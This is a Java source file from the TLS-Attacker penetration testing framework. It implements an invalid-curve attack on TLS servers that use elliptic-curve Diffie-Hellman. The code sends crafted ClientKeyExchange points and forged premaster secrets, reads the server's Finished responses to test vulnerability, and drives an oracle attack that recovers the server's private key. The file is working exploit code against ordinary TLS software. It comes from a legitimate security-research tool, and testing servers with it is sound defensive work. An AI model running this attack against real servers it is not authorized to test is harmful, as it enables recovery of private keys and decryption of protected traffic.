/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackConfig;
import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.KeyExchangeAlgorithm;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.crypto.ec.Curve;
import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.core.crypto.ec.ECComputer;
import de.rub.nds.tlsattacker.core.crypto.ec.Point;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.math.BigInteger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.BigIntegers;

public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {

    private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttacker.class);

    private BigInteger premasterSecret;

    public InvalidCurveAttacker(InvalidCurveAttackConfig config) {
        super(config, false);
    }

    @Override
    public void executeAttack() {
        Config tlsConfig = config.createConfig();
        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getNamedCurves().get(0));
        Curve curve = CurveFactory.getNamedCurve(tlsConfig.getNamedCurves().get(0).name());
        RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations());
        attacker.attack();
        BigInteger result = attacker.getResult();
        LOGGER.info("Result found: {}", result);
    }

    @Override
    public Boolean isVulnerable() {
        if (!KeyExchangeAlgorithm.isEC(AlgorithmResolver.getKeyExchangeAlgorithm(config.createConfig()
                .getDefaultSelectedCipherSuite()))) {
            LOGGER.info("The CipherSuite that should be tested is not an Ec one:"
                    + config.createConfig().getDefaultSelectedCipherSuite().name());
            return null;
        }
        ECComputer computer = new ECComputer();
        CurveFactory.getNamedCurve(config.getNamedCurve().getJavaName());
        Curve curve = CurveFactory.getNamedCurve(config.getNamedCurve().getJavaName());
        computer.setCurve(curve);
        Point point = new Point(config.getPublicPointBaseX(), config.getPublicPointBaseY());
        for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
            if (config.getPremasterSecret() != null) {
                premasterSecret = config.getPremasterSecret();
            } else {

                computer.setSecret(BigInteger.valueOf(i + 1));
                try {
                    premasterSecret = computer.mul(point).getX();
                    if (premasterSecret == null) {
                        premasterSecret = BigInteger.ZERO;
                    }
                    LOGGER.debug(premasterSecret.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            try {
                WorkflowTrace trace = executeProtocolFlow();
                if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
                    LOGGER.info("Did not receive ServerHello. Check your config");

                    return null;
                }
                if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
                    LOGGER.info("Received no finished Message in Protocolflow:" + i);
                } else {
                    LOGGER.info("Received a finished Message in Protocolflow: " + i + "! Server is vulnerable!");
                    return true;
                }
            } catch (WorkflowExecutionException ex) {
                LOGGER.debug(ex.getLocalizedMessage());
            }
        }
        return false;
    }

    private WorkflowTrace executeProtocolFlow() {
        Config tlsConfig = config.createConfig();
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                RunningModeType.CLIENT);
        trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
                tlsConfig), new FinishedMessage(tlsConfig)));
        trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);

        ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] points = ArrayConverter.concatenate(ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseX()),
                ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseY()));
        byte[] serialized = ArrayConverter.concatenate(new byte[] { 4 }, points);
        serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
        message.setPublicKey(serializedPublicKey);
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitPMS = BigIntegers.asUnsignedByteArray(config.getCurveFieldSize(), premasterSecret);
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
        message.prepareComputations();
        message.getComputations().setPremasterSecret(pms);
        LOGGER.info("working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
        workflowExecutor.executeWorkflow();
        return trace;
    }
}
